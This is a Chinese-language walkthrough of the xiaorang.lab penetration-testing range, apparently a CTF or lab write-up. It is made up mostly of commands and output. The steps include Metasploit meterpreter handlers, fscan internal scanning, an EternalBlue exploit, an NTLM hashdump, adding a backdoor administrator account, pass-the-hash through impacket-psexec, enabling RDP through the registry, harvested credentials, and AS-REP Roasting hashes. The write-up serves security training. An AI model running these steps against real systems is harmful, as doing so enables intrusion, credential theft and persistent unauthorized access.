+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-regexp">/wp-content/</span>themes<span class="hljs-regexp">/twentytwentyone/</span>footer.php<br></code></pre></td></tr></table></figure>
+
+<p>拿flag</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript"> ________ ___       ________  ________  ________    _____     <br>|<span class="hljs-string">\</span>  _____<span class="hljs-string">\\</span>  <span class="hljs-string">\</span>     |<span class="hljs-string">\</span>   __  <span class="hljs-string">\|\</span>   ____<span class="hljs-string">\|\</span>   __  <span class="hljs-string">\</span>  / __  <span class="hljs-string">\</span>    <br><span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\__/\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\|\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\___|\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\|\</span>  <span class="hljs-string">\|\/_|\</span>  <span class="hljs-string">\</span>   <br> <span class="hljs-string">\</span> <span class="hljs-string">\</span>   __<span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>   __  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>  __<span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\\</span>  <span class="hljs-string">\|/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>  <br>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\____\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\|\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <br>   <span class="hljs-string">\</span> <span class="hljs-string">\__\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\__\</span> <span class="hljs-string">\__\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\_______\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\__\</span><br>    <span class="hljs-string">\|__|</span>    <span class="hljs-string">\|_______|\|__|\|__|\|_______|\|_______|</span>    <span class="hljs-string">\|__|</span><br><br><br>	flag01: flag&#123;<span class="hljs-number">7ce</span>93c7e-<span class="hljs-number">5171</span>-<span class="hljs-number">4938</span>-a1db-<span class="hljs-number">3fe</span>0e02f9e74&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><p>上msf，蚁剑马或Linux马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler <br><span class="hljs-built_in">set</span> payload php/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 39.99.151.78<br><span class="hljs-built_in">set</span> lport 54522<br>exploit<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 39.99.151.78<br><span class="hljs-built_in">set</span> LPORT 54522<br>run<br></code></pre></td></tr></table></figure>
+
+<p>fscan扫一下</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ifconfig<br>eth0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">26</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>  broadcast <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span><br>        inet6 fe80::<span class="hljs-number">216</span>:3eff:fe13:1ecc  prefixlen <span class="hljs-number">64</span>  scopeid 0x20&lt;link&gt;<br>        ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:3e:<span class="hljs-number">13</span>:1e:cc  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)<br>        RX packets <span class="hljs-number">322654</span>  bytes <span class="hljs-number">262446065</span> (<span class="hljs-number">262</span>.<span class="hljs-number">4</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">176655</span>  bytes <span class="hljs-number">98135623</span> (<span class="hljs-number">98</span>.<span class="hljs-number">1</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>lo: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span><br>        inet <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>        inet6 ::<span class="hljs-number">1</span>  prefixlen <span class="hljs-number">128</span>  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        RX packets <span class="hljs-number">28728</span>  bytes <span class="hljs-number">14434947</span> (<span class="hljs-number">14</span>.<span class="hljs-number">4</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">28728</span>  bytes <span class="hljs-number">14434947</span> (<span class="hljs-number">14</span>.<span class="hljs-number">4</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>trying RunIcmp2<br>The current user permissions unable to send icmp packets<br>start ping<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">26</span>    is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">5</span><br><span class="hljs-number">172.22.15.13:88</span> open<br><span class="hljs-number">172.22.15.24:3306</span> open<br><span class="hljs-number">172.22.15.24:445</span> open<br><span class="hljs-number">172.22.15.13:445</span> open<br><span class="hljs-number">172.22.15.35:445</span> open<br><span class="hljs-number">172.22.15.18:445</span> open<br><span class="hljs-number">172.22.15.24:139</span> open<br><span class="hljs-number">172.22.15.13:139</span> open<br><span class="hljs-number">172.22.15.35:139</span> open<br><span class="hljs-number">172.22.15.18:139</span> open<br><span class="hljs-number">172.22.15.13:135</span> open<br><span class="hljs-number">172.22.15.35:135</span> open<br><span class="hljs-number">172.22.15.24:135</span> open<br><span class="hljs-number">172.22.15.18:135</span> open<br><span class="hljs-number">172.22.15.24:80</span> open<br><span class="hljs-number">172.22.15.18:80</span> open<br><span class="hljs-number">172.22.15.26:80</span> open<br><span class="hljs-number">172.22.15.26:22</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">18</span><br>start vulscan<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>       code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>/www<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span><br>   <span class="hljs-string">[-&gt;]</span>XR-<span class="hljs-number">0687</span><br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span>XR-CA<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span><br>   <span class="hljs-string">[-&gt;]</span>XR-DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span><br>   <span class="hljs-string">[-&gt;]</span>XR-WIN08<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span>    XIAORANG\XR-<span class="hljs-number">0687</span>              <br><span class="hljs-string">[+]</span> MS17-<span class="hljs-number">010</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>       (Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> OsInfo <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span> (Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>    WORKGROUP\XR-WIN08                  Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span>    XR-CA.xiaorang.lab                  Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span>    <span class="hljs-string">[+]</span> DC:XR-DC01.xiaorang.lab          Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>/www/sys/index.php code:<span class="hljs-number">200</span> len:<span class="hljs-number">135</span>    title:None<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">26</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">39962</span>  title:XIAORANG.LAB<br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span> poc-yaml-active-directory-certsrv-detect <br>已完成 <span class="hljs-number">18</span>/<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">13</span>.740580994s<br></code></pre></td></tr></table></figure>
+
+<p>总结一下</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake">(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span>    XR-CA.xiaorang.lab <br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span>    XIAORANG\XR-<span class="hljs-number">0687</span><br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>    DC:XR-DC01.xiaorang.lab<br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span>    WORKGROUP\XR-WIN08 MS17-<span class="hljs-number">010</span><br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span>    入口<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">IP地址</th>
+<th align="left">NetBIOS名称</th>
+<th align="left">域&#x2F;工作组</th>
+<th align="left">系统信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">172.22.15.13</td>
+<td align="left">XR-DC01</td>
+<td align="left">DC:XR-DC01 .xiaorang.lab</td>
+<td align="left">Windows Server 2016 Standard 14393</td>
+</tr>
+<tr>
+<td align="left">172.22.15.18</td>
+<td align="left">XR-CA.xiaorang.lab</td>
+<td align="left">-</td>
+<td align="left">Windows Server 2016 Standard 14393</td>
+</tr>
+<tr>
+<td align="left">172.22.15.24</td>
+<td align="left">XR-WIN08</td>
+<td align="left">WORKGROUP</td>
+<td align="left">Windows Server 2008 R2 Enterprise 7601 SP1</td>
+</tr>
+<tr>
+<td align="left">172.22.15.35</td>
+<td align="left">XIAORANG\XR-0687</td>
+<td align="left">-</td>
+<td align="left">未提供</td>
+</tr>
+</tbody></table>
+<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>msf直接打，发现msf中route add打这个不好使，所以用stowaway代理打</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">search ms17-010<br><br><span class="hljs-comment"># 获取meterpreter</span><br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> proxies socks5:127.0.0.1:55556<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.15.24<br><span class="hljs-built_in">set</span> lport 54524<br><span class="hljs-built_in">run</span><br><br><span class="hljs-comment"># 单个命令执行</span><br>use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhosts 172.22.15.24<br><span class="hljs-built_in">set</span> command whoami<br>run<br></code></pre></td></tr></table></figure>
+
+<p>dump哈希</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">meterpreter &gt; hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>e52d03e9b939997401466a0ec5a9cbc:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">matrix:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>f12c506328bbee07e9a3f4c1a8fb7de:::<br><span class="hljs-symbol">qaq:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c780c78872a102256e946b3ad238f661</span>::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
+
+<p>如果进不去shell的话，可以用msf的powershell添加用户（用proxychains的话有时会进不去shell）</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">load</span> powershell<br>powershell_execute <span class="hljs-string">&quot;net user matrix Matrix2025! /add&quot;</span><br>powershell_execute <span class="hljs-string">&quot;net localgroup administrators matrix /add&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>哈希传递上去（不加gbk执行命令会报错），拿flag</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">proxychains4 impacket-psexec administrator<span class="hljs-meta">@172.22.15.24</span> -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk<br><br>C:\Windows\system32&gt;type C:\Users\Administrator\flag\flag02.txt<br>type C:\Users\Administrator\flag\flag02.txt<br>  __ _              ___  __ <br> / _|<span class="hljs-string"> </span>|<span class="hljs-string">            / _ \/_ </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> __ _  __ _</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>||<span class="hljs-string"> </span>|<br>|<span class="hljs-string">  _</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>||<span class="hljs-string"> </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>||<span class="hljs-string"> </span>|<br>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">\__, </span>|<span class="hljs-string">\___/ </span>|<span class="hljs-string">_</span>|<br>              __/ |<span class="hljs-string">         </span><br><span class="hljs-string">             </span>|<span class="hljs-string">___/          </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">flag02: flag&#123;ef850164-6bb5-442c-bb4e-22729b1fca26&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现是之前windows自动更新了，加了些限制，看这个博客可以成功解决：<a target="_blank" rel="noopener" href="https://blog.csdn.net/juanjuan_01/article/details/127005255">https://blog.csdn.net/juanjuan_01/article/details/127005255</a></p>
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>创建用户并rdp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户</span><br>net user matrix Matrix2025! /add<br>net localgroup administrators matrix /add<br>net user matrix /domain<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br><span class="hljs-comment"># xfreerdp应该这样用</span><br>proxychains xfreerdp3 /u:matrix /p:<span class="hljs-string">&#x27;Matrix2025!&#x27;</span> /v:172.22.15.24 /cert:ignore /sec:nla /tls:seclevel:0<br></code></pre></td></tr></table></figure>
+
+<p>进去发现小皮，看下数据库密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root/root@#123<br>zdoo/zdoo123<br></code></pre></td></tr></table></figure>
+
+<p>网站服务发现有phpmyadmin，用上面root账号登录，</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//172.22.15.24/phpmyadmin</span><br></code></pre></td></tr></table></figure>
+
+<p>发现其中 zdoo 有个表有一堆域账户，导出用户</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210431.png" srcset="/img/loading.gif" lazyload alt="image-20250828210656204"></p>
+<p>或者从网站后台获得</p>
+<blockquote>
+<p>从后台获取多个员工邮箱地址：</p>
+<ol>
+<li>通过admin&#x2F;123456成功登录OA系统</li>
+<li>在“团队”——“同事”中发现多个员工的邮箱地址</li>
+<li>通过邮箱构造用户名字典，用于后续枚举用户</li>
+</ol>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210436.png" srcset="/img/loading.gif" lazyload alt="image-20250828232842035"></p>
+<pre><code class="hljs">lixiuying@xiaorang.lab
+lixiaoliang@xiaorang.lab
+zhangyi@xiaorang.lab
+jiaxiaoliang@xiaorang.lab
+zhangli@xiaorang.lab
+zhangwei@xiaorang.lab
+liuqiang@xiaorang.lab
+wangfang@xiaorang.lab
+wangwei@xiaorang.lab
+wanglihong@xiaorang.lab
+huachunmei@xiaorang.lab
+wanghao@xiaorang.lab
+zhangxinyu@xiaorang.lab
+huzhigang@xiaorang.lab
+lihongxia@xiaorang.lab
+wangyulan@xiaorang.lab
+chenjianhua@xiaorang.lab
+</code></pre>
+<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>Kerberos身份认证的第一个过程又被称为域身份验证，主要是为了防止与用户密码脱机爆破。</p>
+<p>如果与用户关闭了预身份验证（“Do not require Kerberos preauthentication”）的话，攻击者可以使用指定的用户向域控制器发送AS-REQ请求。然后域控制器会返回TGT票据和加密的Session-key等信息。因此攻击者就可以对获取到的加密Session-key进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。这种攻击方式被称作AS-REP Roasting攻击。</p>
+<p>跑一下有没有AS-REP Roasting</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-GetNPUsers xiaorang.lab/ -dc-ip <span class="hljs-number">172.22.15.13</span> -usersfile user.txt -request -outputfile hash.txt<br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$lixiuying</span><span class="hljs-variable">@XIAORANG</span>.LAB:dff8a2168f64b09e64a689985a8fed3b<span class="hljs-variable">$377</span>d5d1d3f662d0fe73579492004ce28c209b70f38206499168a900adf02518f9947084ac6937b30a9d3ca94b5a6aaffd781ac46bce393c9a00586512c510b4631a6e2d066e79248e99c8eb12b925fb6be2c6ea67836f69d8cc9a2b61779e0c95716387659810f5c5c4fbc5b4c2156327fe5aafff701f02189a16a78364d22013689eb9684816c3e58dadbaa461bf18833afbdedf34b3460db6b0f4d26bd56f1ee189b61ec8bbaf2756021b1dd28bfd86beaa3d068f52a18aeb39ccd5bc0e749f694b07b0a4107c32a26d109e42941e6e390d1a2066cedefe67d8038a90571cdd68b41121da67d37b4ced473<br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$huachunmei</span><span class="hljs-variable">@XIAORANG</span>.LAB:8093f1814c0365f275375cd91240db0d<span class="hljs-variable">$0</span>b19ba12d1018d5b74426931c713522d8db5b0eed6d50ab0d87308faf73fc6179237cfad0fd7d5d9cde627c14e600f6b121a5cfbfccb56869a01694e2b7953cd8c9635fb5c66c64786502e748734d920d11d378b4d3e05517c72c2d03c3126615c0cfec43f5f02c9abc7a52378502bafc885a8b1f48f673e49f9d5045ddece3619f820948391af8d769aae19bac6f2295cd0d24db450cd5e4783482ad8fa6b1e11f35207a00d9d7532769e46c57d981e22866de65058cd610d840228596b077a9fb6372170067368db40b028c1103d2b8e811cfd0bbcdd7b4b1e2dbc55dc175b53b4ec329ddbbe030b414326<br></code></pre></td></tr></table></figure>
+
+<p>john或者hashcat爆破</p>
